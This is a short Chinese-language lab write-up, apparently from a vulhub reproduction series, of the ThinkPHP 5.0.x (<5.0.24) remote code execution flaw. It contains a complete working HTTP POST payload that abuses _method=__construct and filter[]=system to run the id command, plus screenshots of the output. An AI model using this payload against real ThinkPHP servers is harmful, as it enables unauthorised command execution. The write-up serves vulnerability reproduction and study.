# ThinkPHP5 5.0.23远程执行代码漏洞

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行--->有回显

### 0x01漏洞介绍

​			ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5.0（<5.0.24）中，框架在获取请求方法时会错误地对其进行处理，这使攻击者可以调用Request类的任何方法，从而通过特定的利用链导致RCE漏洞。

### 0x02漏洞复现

#### payload1：

POST /index.php?s=captcha HTTP/1.1

Host: 192.168.15.130:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: JSESSIONID=1v1yqdlc1zren12n0cs4wcfwgp; PHPSESSID=1bb9e7bee96c5ec0fe76b552020c8719

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 72



_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id



​			**默认页面**

![ThinkPHP5_x_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP5_x_rce_1.jpg)



​			**burpsuite改包，id被执行，有回显**

​				![ThinkPHP5_x_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP5_x_rce_2.jpg)



​	

### 0x03参考资料

https://blog.csdn.net/nicesa/article/details/106247668
